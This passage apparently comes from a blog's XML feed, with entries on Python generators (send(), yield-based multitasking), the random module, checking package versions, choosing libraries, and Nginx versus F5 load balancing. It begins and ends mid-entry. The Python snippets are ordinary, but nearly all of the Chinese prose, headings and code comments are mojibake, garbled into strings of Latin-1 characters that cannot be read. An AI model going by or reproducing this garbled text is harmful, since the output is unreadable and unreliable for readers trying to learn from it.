å”¤é†’æˆ‘ä»¬é™¤äº†å¯ä»¥ä½¿ç”¨<strong>next()</strong>å‡½æ•°æ¥å”¤é†’ç”Ÿæˆå™¨ç»§ç»­æ‰§è¡Œå¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<strong>send()</strong>å‡½æ•°æ¥å”¤é†’æ‰§è¡Œã€‚ä½¿ç”¨send()å‡½æ•°çš„ä¸€ä¸ªå¥½å¤„æ˜¯å¯ä»¥åœ¨å”¤é†’çš„åŒæ—¶å‘æ–­ç‚¹å¤„ä¼ å…¥ä¸€ä¸ªé™„åŠ æ•°æ®ã€‚å³ï¼šä½¿ç”¨send å”¤é†’ yield a çš„åŒæ—¶ï¼Œå°†æ¶ˆæ¯ä¼ é€’ç»™ yield a çš„ç»“æœã€‚å³ï¼štemp = yieldaï¼Œ temp å°±æ˜¯å½“ä½¿ç”¨ send å”¤é†’æ—¶ï¼Œä¼ å…¥çš„ç»“æœã€‚</p><p>ä¾‹å­ï¼šæ‰§è¡Œåˆ° yield æ—¶ï¼Œgen å‡½æ•°ä½œç”¨æš‚æ—¶ä¿å­˜ï¼Œè¿”å› i çš„å€¼; tempæ¥æ”¶ä¸‹æ¬¡ c.send("python")ï¼Œsend å‘é€è¿‡æ¥çš„å€¼ï¼Œc.next()ç­‰ä»·c.send(None)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: <span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">   ....:     i = <span class="number">0</span></span><br><span class="line">   ....:     <span class="keyword">while</span> i&lt;<span class="number">5</span>:</span><br><span class="line">   ....:         temp = <span class="keyword">yield</span> i</span><br><span class="line">   ....:         <span class="built_in">print</span>(temp)</span><br><span class="line">   ....:         i+=<span class="number">1</span></span><br><span class="line">   ....:</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong></p><ol type="1"><li>send()ä¸èƒ½ä½œä¸ºç¬¬ä¸€æ¬¡å”¤é†’ä½¿ç”¨ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡ä»ç”Ÿæˆå™¨çš„å¼€å§‹æ‰§è¡Œï¼Œè€Œå¼€å§‹å¾€å¾€ä¸æ˜¯yield aï¼Œ è¿™æ ·å°±æ²¡æœ‰ä¸œè¥¿æ¥å— send ä¼ å…¥çš„å€¼ï¼Œå› æ­¤ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</li><li>å¦‚æœå¿…é¡»ç¬¬ä¸€æ¬¡ä½¿ç”¨ sendï¼Œ é‚£ä¼ å…¥æ¶ˆæ¯ Noneã€‚å¤§å¤šæƒ…å†µä¸‹ä½¿ç”¨nextã€‚</li><li>next æ˜¯å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨ <code>next(obj)</code>, è€Œ sendæ˜¯è¿­ä»£å™¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨ï¼š<code>obj.send('message')</code></li><li>å…·æœ‰ yield çš„å‡½æ•°æ˜¯ç”Ÿæˆå™¨å¯¹è±¡ï¼Œéœ€è¦å…ˆåˆ›å»ºå¯¹è±¡ï¼Œç„¶åæ‰å¯ä»¥ä½¿ç”¨ã€‚</li></ol><p>è¿­ä»£å™¨å’Œç”Ÿæˆå™¨éƒ½ä¿å­˜ç”Ÿæˆæ•°æ®çš„æ–¹æ³•ï¼Œè€Œä¸æ˜¯æ•°æ®ï¼ŒèŠ‚çœç©ºé—´ã€‚</p><p>è¿­ä»£å™¨å‡å°‘å†…å­˜ç©ºé—´ï¼Œç”Ÿæˆå¾ªç¯ã€‚ç”Ÿæˆå™¨å¯ä»¥è®©ä¸€ä¸ªå‡½æ•°çœ‹ä¸Šå»æš‚åœæ‰§è¡Œï¼Œå¹¶è¿”å›ç»“æœã€‚</p><h1 id="yield-å®Œæˆå¤šä»»åŠ¡">yield å®Œæˆå¤šä»»åŠ¡</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task_one</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-----1-----&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task_two</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-----2-----&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    t1 = task_one()</span><br><span class="line">    t2 = task_two()</span><br><span class="line"><span class="comment"># å…ˆè®© yield è¿è¡Œä¸€ä¼šï¼Œå½“ t1 ä¸­é‡åˆ° yield çš„æ—¶å€™ï¼Œå†è¿”å›åˆ° 24 è¡Œ</span></span><br><span class="line">    <span class="comment"># ç„¶åï¼Œæ‰§è¡Œ t2ï¼Œ å½“å®ƒé‡åˆ° yield çš„æ—¶å€™ï¼Œå†æ¬¡åˆ‡æ¢åˆ° t1 ä¸­</span></span><br><span class="line">    <span class="comment"># è¿™æ · t1/t2/t1/t2 çš„äº¤æ›¿è¿è¡Œï¼Œæœ€ç»ˆå®ç°äº†å¤šä»»åŠ¡  ---- åç¨‹</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">next</span>(t1)</span><br><span class="line">        <span class="built_in">next</span>(t2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>çº¿ç¨‹ä¾èµ–äºè¿›ç¨‹ï¼Œåç¨‹ä¾èµ–äºçº¿ç¨‹ã€‚</p><p>åç¨‹ä½¿ç”¨çš„æ˜¯å•çº¿ç¨‹ï¼Œå®ƒåªæ˜¯å……åˆ†åˆ©ç”¨å»¶æ—¶çš„æ—¶é—´ã€‚</p><h2 id="random-æ¨¡å—å¸¸ç”¨å‡½æ•°">random æ¨¡å—å¸¸ç”¨å‡½æ•°</h2><h3 id="random.randrange">random.randrange</h3><blockquote><p>random.randrange(<em>stop</em>)</p><p>random.randrange(<em>start</em>, <em>stop</em>[, <em>step</em>])</p></blockquote><p>ä» range([<em>start</em>], <em>stop</em>[, <em>step</em>])ä¸­ï¼Œå³ï¼š<code>[start, stop)</code>ï¼Œæ­¥é•¿ä¸º stepçš„æ•´æ•°åºåˆ—ä¸­éšæœºé€‰å–ä¸€ä¸ªæ•´æ•°ã€‚</p><h3 id="random.randint">random.randint</h3><blockquote><p><code>random.randint</code>(<em>a</em>, <em>b</em>)</p></blockquote><p>ä» [a, b] ä¸­è¿”å›ä¸€ä¸ªéšæœºæ•´æ•°ï¼Œ åŒï¼šrandrange(a, b+1)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">25</span>]: random.randint(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">Out[<span class="number">25</span>]: <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="random.choice">random.choice</h3><blockquote><p>Random.choice(seq)</p></blockquote><p>ä»åºåˆ— seq ä¸­éšæœºé€‰å–ä¸€ä¸ªå…ƒç´ ï¼ˆæ— è®ºç±»å‹ï¼‰ï¼Œå¦‚æœ seqä¸ºç©ºï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: random.choice([<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="number">3</span>])</span><br><span class="line">Out[<span class="number">31</span>]: <span class="string">&#x27;6&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="random.shuffle">random.shuffle</h3><blockquote><p>Random.shuffle(x[, random])</p></blockquote><p>å¯¹åºåˆ—å…ƒç´ è¿›è¡Œéšæœºæ’åº(ç›´æ¥æ”¹å˜åŸåºåˆ—)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">37</span>]: num = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: random.shuffle(num)</span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: num</span><br><span class="line">Out[<span class="number">39</span>]: [<span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python å°çŸ¥è¯†</title>
      <link href="/blog/2021/06/15/programming/python/python_skills/"/>
      <url>/blog/2021/06/15/programming/python/python_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="python-æŸ¥çœ‹åŒ…ç‰ˆæœ¬">python æŸ¥çœ‹åŒ…ç‰ˆæœ¬</h2><p>ä»¥ä¸‹ç”¨æŸ¥è¯¢ requests çš„ç‰ˆæœ¬ä¿¡æ¯åšæ¼”ç¤ºã€‚</p><h3 id="pip">pip</h3><ol type="1"><li><code>pip show requests</code></li><li><code>pip list | grep requests</code></li></ol><h3 id="python">Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: requests.__version__</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">&#x27;2.23.0&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="python-ä½¿ç”¨é€‚åˆéœ€æ±‚çš„åº“">Python ä½¿ç”¨é€‚åˆéœ€æ±‚çš„åº“</h1><p>Python å¦‚ä½•å¯»æ‰¾ã€åˆ¤æ–­é€‚åˆéœ€æ±‚çš„åº“ï¼Œ æŒ‰ç…§æ–¹æ³•çš„ä¼˜å…ˆæ¬¡åºä»‹ç»å¦‚ä¸‹</p><h2 id="å¯»æ‰¾">å¯»æ‰¾</h2><h3 id="google">Google</h3><ol type="1"><li><p>ç¬¬ä¸‰æ–¹åº“ ä¾‹å¦‚ï¼š</p><ol type="1"><li>å†™æˆªå›¾ OCR æ—¶ï¼Œæˆ‘éœ€è¦ hook é”®ç›˜è¾“å…¥ï¼Œå®ç°å¿«æ·é”®æˆªå›¾ï¼Œæœï¼šâ€œPythonkeyboard hookâ€</li><li>å¦‚æœæˆ‘è¦ç€ä¸€ä¸ª markdwon è§£æå™¨ï¼Œæœï¼šâ€œpython markdown parserâ€</li></ol></li><li><p>æŸ¥æ‰¾æ ‡å‡†åº“ æœï¼š"Python standard library logging"</p></li></ol><h3 id="github-awesome-python">Github awesome-python</h3><p>awesome-python ç³»åˆ—å¤§éƒ½æ˜¯ Python å¼€æºä¸–ç•Œçš„ç²¾å“ï¼Œå…¶ä¸­ä¹ŸåŒ…å«éƒ¨åˆ†Python æ ‡å‡†åº“ã€‚</p><p><a href="https://github.com/vinta/awesome-python">awesome-pythonGithub</a>ï¼Œç›´æ¥ <code>Ctrl+F</code> æœç´¢å…³é”®å­—ï¼Œ æ¯”å¦‚ï¼šhookï¼Œlogging</p><h3 id="æ ‡å‡†åº“å®˜ç½‘">æ ‡å‡†åº“å®˜ç½‘</h3><p>åœ¨ <a href="https://docs.python.org/3/">The Python StandardLibrary</a>ç½‘ç«™ç›´æ¥æœç´¢</p><h2 id="åˆ¤æ–­">åˆ¤æ–­</h2><p>å‡ ä¸ªå¯ä»¥è€ƒè™‘çš„å› ç´ :</p><ol type="1"><li>å¯¹åº” Github ç­‰ä»£ç ä»“åº“çš„ star ä¸ªæ•°ï¼›</li><li>ç¤¾åŒºçš„æ´»è·ƒç¨‹åº¦ï¼Œæ›´æ–°é¢‘ç‡ï¼›</li><li>æ–‡æ¡£å®Œå–„ç¨‹åº¦ï¼Œå‡½æ•°ã€å‚æ•°è§£é‡Šï¼Œç¤ºä¾‹æ˜¯å¦è¯¦ç»†æ¸…æ¥šï¼›</li><li>æ™®åŠç‡ï¼šçœ‹å®ç°è¯¥åŠŸèƒ½çš„ç¨‹åºæ˜¯å¦å¾ˆå¤šä½¿ç”¨äº†è¯¥åº“ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nginx å’Œ F5 è´Ÿè½½å‡è¡¡</title>
      <link href="/blog/2021/06/15/websec/devices/nginx_f5/"/>
      <url>/blog/2021/06/15/websec/devices/nginx_f5/</url>
      
        <content type="html"><![CDATA[<h1 id="nginx-å’Œ-f5-è´Ÿè½½å‡è¡¡">Nginx å’Œ F5 è´Ÿè½½å‡è¡¡</h1><p>è½¬è½½è‡ªï¼ˆ<a href="https://zhuanlan.zhihu.com/p/23161920">æµ…è°ˆ Nginxè´Ÿè½½å‡è¡¡ä¸ F5 çš„åŒºåˆ« - çŸ¥ä¹</a>ï¼‰</p><h2 id="å‰è¨€">å‰è¨€</h2><p>ç¬”è€…æœ€è¿‘åœ¨è´Ÿè´£æŸé›†å›¢ç½‘ç«™æ—¶ï¼ŒåŒæ—¶ç”¨åˆ°äº† Nginx ä¸F5ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œè´Ÿè½½å‡è¡¡å™¨ F5 ä½œä¸ºå¤„ç†å¤–ç•Œè¯·æ±‚çš„ç¬¬ä¸€é“â€œå¢™â€ï¼Œå°†è¯·æ±‚åˆ†å‘åˆ°web æœåŠ¡å™¨åï¼Œweb æœåŠ¡å™¨ä¸Šçš„ Nginxå†è¿›è¡Œå¤„ç†ï¼Œé™æ€å†…å®¹ç›´æ¥è®¿é—®æœ¬åœ°é—¨æˆ·ï¼ŒåŠ¨æ€æ•°æ®åˆ™é€šè¿‡åå‘ä»£ç†æŒ‡å‘å†…ç½‘æœåŠ¡ã€‚</p><p>å…¶å® Nginx å’Œ F5è¿™ä¸¤è€…å‡å¯ç”¨ä½œç½‘ç«™è´Ÿè½½å‡è¡¡ï¼Œé‚£äºŒè€…æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿç¬”è€…åœ¨æ­¤æµ…è°ˆä¸‹ Nginx ä¸F5 çš„ä¸€äº›åŒºåˆ«ã€‚</p><p>ç›®å‰å¾ˆå¤šç½‘ç«™æˆ–åº”ç”¨åœ¨è®¾è®¡ä¹‹åˆéƒ½ä¼šä¸ºé«˜å¹¶å‘çš„æ•°æ®è¯·æ±‚åšè´Ÿè½½å‡è¡¡ï¼Œä¸å·®é’±çš„åœŸè±ªç”¨æˆ·ä¸€èˆ¬ä¼šç›´æ¥ä¹°F5ç¡¬ä»¶è®¾å¤‡ä½œä¸ºå…¶è´Ÿè½½å‡è¡¡å™¨ï¼ŒåŸå› ä¸ç”¨å¤šè¯´ï¼Œå…¶åŠŸèƒ½å¼ºå¤§ï¼Œä¸ä»…åŒ…å«è´Ÿè½½å‡è¡¡è¿˜åŒ…æ‹¬åº”ç”¨äº¤æ¢ã€ä¼šè¯äº¤æ¢ã€çŠ¶æ€ç›‘æ§ã€æ™ºèƒ½ç½‘ç»œåœ°å€è½¬æ¢ã€é€šç”¨æŒç»­æ€§ã€å“åº”é”™è¯¯å¤„ç†ã€IPv6ç½‘å…³ã€é«˜çº§è·¯ç”±ã€æ™ºèƒ½ç«¯å£é•œåƒã€SSL åŠ é€Ÿã€æ™ºèƒ½ HTTP å‹ç¼©ã€TCP ä¼˜åŒ–ã€ç¬¬ 7å±‚é€Ÿç‡æ•´å½¢ã€å†…å®¹ç¼“å†²ã€å†…å®¹è½¬æ¢ã€è¿æ¥åŠ é€Ÿã€é«˜é€Ÿç¼“å­˜ã€CookieåŠ å¯†ã€é€‰æ‹©æ€§å†…å®¹åŠ å¯†ã€åº”ç”¨æ”»å‡»è¿‡æ»¤ã€æ‹’ç»æœåŠ¡(DoS)æ”»å‡»å’Œ SYN Floodä¿æŠ¤ã€é˜²ç«å¢™è¿‡æ»¤ç­‰åŠŸèƒ½ï¼Œæ˜¯ä¸æ˜¯å¾ˆå¼ºå¤§ï¼Ÿå½“ç„¶ä»·æ ¼ä¹Ÿæ˜¯è®©äººå¾ˆâ€œå¿ƒåŠ¨â€ã€‚è€Œä¸€äº›é¢„ç®—å¹¶ä¸é«˜ï¼Œæ­£åœ¨åˆæœŸå‘å±•çš„ç½‘ç«™æ¥è¯´ï¼ŒNginxè¿™ç§è½¯è´Ÿè½½ä¹Ÿèƒ½å¾ˆå¥½çš„æ»¡è¶³å…¶æ•°æ®åˆ†æµçš„éœ€æ±‚ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ Nginxæ˜¯å¦‚ä½•æ»¡è¶³æˆ‘ä»¬çš„è´Ÿè½½å‡è¡¡éœ€æ±‚çš„ï¼š</p><h2 id="ä»€ä¹ˆæ˜¯-nginx">ä»€ä¹ˆæ˜¯ Nginxï¼š</h2><p>Nginxï¼šé«˜æ€§èƒ½çš„ HTTP å’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼ŒåŒæ—¶æ”¯æŒä½œä¸º IMAP/POP3/SMTPä»£ç†æœåŠ¡å™¨ã€‚ç›®å‰è¢«å¾ˆå¤šç½‘ç«™åº”ç”¨ä¸ºå…¶ HTTPè½¯è´Ÿè½½å‡è¡¡å™¨ã€‚é«˜æ•ˆçš„æ€§èƒ½ã€è‰¯å¥½çš„ç¨³å®šæ€§ã€ä¸°å¯Œçš„åŠŸèƒ½é›†ã€ç¤ºä¾‹é…ç½®æ–‡ä»¶å’Œä½ç³»ç»Ÿèµ„æºçš„æ¶ˆè€—æ­£é€æ¸è¢«å¤§å‹äº’è”ç½‘å…¬å¸æ‰€é’çã€‚ä¾‹å¦‚è…¾è®¯ã€æ·˜å®ã€æ–°æµªç­‰å¤§å‹é—¨æˆ·åŠå•†ä¸šç½‘ç«™éƒ½é‡‡ç”¨Nginx è¿›è¡Œ HTTP ç½‘ç«™çš„æ•°æ®åˆ†æµã€‚</p><h2 id="nginx-åŠŸèƒ½ç‰¹ç‚¹">Nginx åŠŸèƒ½ç‰¹ç‚¹ï¼š</h2><ol type="1"><li>å·¥ä½œåœ¨ç½‘ç»œçš„ 7 å±‚ä¹‹ä¸Šï¼Œå¯ä»¥é’ˆå¯¹ httpåº”ç”¨åšä¸€äº›åˆ†æµçš„ç­–ç•¥ï¼Œæ¯”å¦‚é’ˆå¯¹åŸŸåã€ç›®å½•ç»“æ„ï¼›</li><li>Nginx å¯¹ç½‘ç»œçš„ä¾èµ–æ¯”è¾ƒå°ï¼›</li><li>Nginx å®‰è£…å’Œé…ç½®æ¯”è¾ƒç®€å•ï¼Œæµ‹è¯•èµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ï¼›</li><li>å¯ä»¥æ‰¿æ‹…é«˜çš„è´Ÿè½½å‹åŠ›ä¸”ç¨³å®šï¼Œä¸€èˆ¬èƒ½æ”¯æ’‘è¶…è¿‡ 1 ä¸‡æ¬¡çš„å¹¶å‘ï¼›</li><li>Nginxå¯ä»¥é€šè¿‡ç«¯å£æ£€æµ‹åˆ°æœåŠ¡å™¨å†…éƒ¨çš„æ•…éšœï¼Œæ¯”å¦‚æ ¹æ®æœåŠ¡å™¨å¤„ç†ç½‘é¡µè¿”å›çš„çŠ¶æ€ç ã€è¶…æ—¶ç­‰ç­‰ï¼Œå¹¶ä¸”ä¼šæŠŠè¿”å›é”™è¯¯çš„è¯·æ±‚é‡æ–°æäº¤åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸è¿‡å…¶ä¸­ç¼ºç‚¹å°±æ˜¯ä¸æ”¯æŒurl æ¥æ£€æµ‹ï¼›</li><li>Nginx å¯¹è¯·æ±‚çš„å¼‚æ­¥å¤„ç†å¯ä»¥å¸®åŠ©èŠ‚ç‚¹æœåŠ¡å™¨å‡è½»è´Ÿè½½ï¼›</li><li>Nginx èƒ½æ”¯æŒ http å’Œ Emailï¼›</li></ol><h2 id="åŸç†">åŸç†</h2><p>Nginx é‡‡ç”¨çš„æ˜¯åå‘ä»£ç†æŠ€æœ¯ï¼Œä»£ç†æœåŠ¡å™¨æ¥æ¥å— internetä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™internetä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–å°±è¡¨ç°ä¸ºä¸€ä¸ªæœåŠ¡å™¨ã€‚åå‘ä»£ç†è´Ÿè½½å‡è¡¡æŠ€æœ¯æ˜¯æŠŠå°†æ¥è‡ªinternetä¸Šçš„è¿æ¥è¯·æ±‚ä»¥åå‘ä»£ç†çš„æ–¹å¼åŠ¨æ€åœ°è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„å¤šå°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ï¼Œä»è€Œè¾¾åˆ°è´Ÿè½½å‡è¡¡çš„ç›®çš„ã€‚</p><p>å…·ä½“æ˜¯æ€ä¹ˆè¿è¡Œçš„å‘¢ï¼Ÿå…¶å®å½“ Nginxå¯åŠ¨åï¼Œå…¶å·¥ä½œè¿›ç¨‹æ˜¯ç”±é…ç½®æ–‡ä»¶å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–çš„ï¼Œä¸»è¿›ç¨‹å¤„ç†é…ç½®æ–‡ä»¶ä¸­çš„è¯»å–ã€ç«¯å£ç»‘å®šç­‰ç‰¹æƒæ“ä½œï¼Œä¹‹ååˆ›å»ºä¸€å°ç»„å­è¿›ç¨‹ï¼Œç”±è¿™äº›å­è¿›ç¨‹è¿›è¡Œè¯·æ±‚çš„å¤„ç†ï¼ŒåŒæ—¶ç¼“å­˜åŠ è½½å™¨åŠ è½½ç¡¬ç›˜ä¸­ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œæ¥ç€é€€å‡ºï¼Œä¿è¯èµ„æºå¼€é”€å§‹ç»ˆä¿æŒç€è¾ƒä½çš„çŠ¶æ€ã€‚</p><p>å¯ä»¥çœ‹å‡ºï¼Œåˆ›å»ºçš„å­è¿›ç¨‹å…¶å®åœ¨è´Ÿè´£æ‰€æœ‰çš„å·¥ä½œï¼Œå¤„ç†ç½‘ç»œè¿æ¥ã€ç¡¬ç›˜è¯»å†™æ“ä½œã€ä»¥åŠä¸Šæ¸¸æœåŠ¡å™¨é€šä¿¡ã€‚</p><p>å¦‚å›¾æ‰€ç¤ºï¼šmasert process æ˜¯å…¶ä¸»çº¿ç¨‹ï¼Œworker processé¡¾åæ€ä¹‰ï¼Œâ€œæˆ‘æ˜¯å…·ä½“å¹²æ´»çš„å•¦â€ï¼Œç¬”è€…æˆªå›¾çš„è¿›ç¨‹è¿˜æ˜¯æ¯”è¾ƒå°‘çš„ï¼Œå› ä¸ºè¿™æ˜¯è‡ªå·±çš„æœåŠ¡å™¨ï¼Œæ²¡æœ‰å¤ªå¤šæœåŠ¡ï¼Œå®é™…ä¸šåŠ¡ä¸­æœ‰å¯èƒ½ä¼šå‡ºç°å‡ åä¸ªworker processï¼Œè¿˜æ˜¯æŒºå£®è§‚çš„ã€‚</p><p>Nginx æ¨èçš„é…ç½®æ˜¯ï¼Œä¸€ä¸ªå·¥ä½œè¿›ç¨‹å¯¹åº”ä¸€ä¸ª CPUå†…æ ¸ï¼Œç¡®ä¿ç¡¬ä»¶èµ„æºçš„æœ‰æ•ˆåˆ©ç”¨ã€‚</p><p>ä¸€æ—¦ NGINXæœåŠ¡èµ·æ¥ï¼Œä»…æœ‰å·¥ä½œè¿›ç¨‹åœ¨å¿™ï¼Œæ¯ä¸ªå·¥ä½œè¿›ç¨‹é‡‡ç”¨éé˜»å¡åœ°æ–¹å¼å¤„ç†å¤šä¸ªè¿æ¥ï¼Œé™ä½ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•°ã€‚</p><p>æ¯ä¸ªå·¥ä½œè¿›ç¨‹éƒ½æ˜¯å•çº¿ç¨‹ä¸”ç‹¬ç«‹è¿è¡Œï¼Œè´Ÿè´£è·å–æ–°è¿æ¥å¹¶è¿›è¡Œå¤„ç†ã€‚è¿›ç¨‹ä¹‹é—´é€šè¿‡å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡ï¼Œè¯¸å¦‚ç¼“å­˜æ•°æ®ï¼Œä¼šè¯æŒç»­åŒ–æ•°æ®(essionpersistence data),ä»¥åŠå…¶ä»–å…±äº«èµ„æºã€‚</p><h2 id="f5-çš„è´Ÿè½½å‡è¡¡åŠŸèƒ½">F5 çš„è´Ÿè½½å‡è¡¡åŠŸèƒ½</h2><p>å…¶å®çœ‹åˆ° Nginx çš„åŸç†å’ŒåŠŸèƒ½ï¼Œæ˜¯ä¸æ˜¯è§‰å¾—å·²ç»ä¸éœ€è¦ F5äº†ï¼Ÿå½“ç„¶ä¹Ÿä¸æ˜¯ï¼ŒF5æ¯•ç«Ÿæ˜¯è´Ÿè½½å‡è¡¡çš„è€å‰è¾ˆï¼Œä¸€ç›´ä»¥æ¥éƒ½ä»¥åŠŸèƒ½å¼ºå¤§ï¼Œæ€§èƒ½ç¨³å®šè‘—ç§°ï¼Œå¾ˆå¤šåŠŸèƒ½å…¶å®æ˜¯è½¯è´Ÿè½½æ— æ³•åšåˆ°çš„ã€‚</p><p>F5 BIG-IP ç”¨ä½œ HTTP è´Ÿè½½å‡è¡¡å™¨çš„ä¸»è¦åŠŸèƒ½ï¼š</p><p>1ã€F5 BIG-IP æä¾› 12ç§çµæ´»çš„ç®—æ³•å°†æ‰€æœ‰æµé‡å‡è¡¡çš„åˆ†é…åˆ°å„ä¸ªæœåŠ¡å™¨ï¼Œè€Œé¢å¯¹ç”¨æˆ·ï¼Œåªæ˜¯ä¸€å°è™šæ‹ŸæœåŠ¡å™¨ã€‚</p><p>2ã€F5 BIG-IP å¯ä»¥ç¡®è®¤åº”ç”¨ç¨‹åºèƒ½å¦å¯¹è¯·æ±‚è¿”å›å¯¹åº”çš„æ•°æ®ã€‚å‡å¦‚ F5 BIG-IPåé¢çš„æŸä¸€å°æœåŠ¡å™¨å‘ç”ŸæœåŠ¡åœæ­¢ã€æ­»æœºç­‰æ•…éšœï¼ŒF5ä¼šæ£€æŸ¥å‡ºæ¥å¹¶å°†è¯¥æœåŠ¡å™¨æ ‡è¯†ä¸ºå®•æœºï¼Œä»è€Œä¸å°†ç”¨æˆ·çš„è®¿é—®è¯·æ±‚ä¼ é€åˆ°è¯¥å°å‘ç”Ÿæ•…éšœçš„æœåŠ¡å™¨ä¸Šã€‚è¿™æ ·ï¼Œåªè¦å…¶å®ƒçš„æœåŠ¡å™¨æ­£å¸¸ï¼Œç”¨æˆ·çš„è®¿é—®å°±ä¸ä¼šå—åˆ°å½±å“ã€‚å®•æœºä¸€æ—¦ä¿®å¤ï¼ŒF5BIG-IPå°±ä¼šè‡ªåŠ¨æŸ¥è¯åº”ç”¨ä¿è¯å¯¹å®¢æˆ·çš„è¯·æ±‚ä½œå‡ºæ­£ç¡®å“åº”å¹¶æ¢å¤å‘è¯¥æœåŠ¡å™¨ä¼ é€ã€‚</p><p>3ã€F5 BIG-IP å…·æœ‰åŠ¨æ€ Session çš„ä¼šè¯ä¿æŒåŠŸèƒ½ï¼Œç¬”è€…ä¹Ÿæ˜¯åœ¨ç½‘ç«™ä¸­ä½¿ç”¨çš„F5 å°†ç”¨æˆ· IP ä¸ Session é€šè¿‡ F5 è¿›è¡Œçš„ç»‘å®šï¼Œä½¿å…¶ Session ä¿æŒä¸€è‡´ã€‚</p><p>4ã€F5 BIG-IP çš„ iRules åŠŸèƒ½å¯ä»¥åš HTTPå†…å®¹è¿‡æ»¤ï¼Œæ 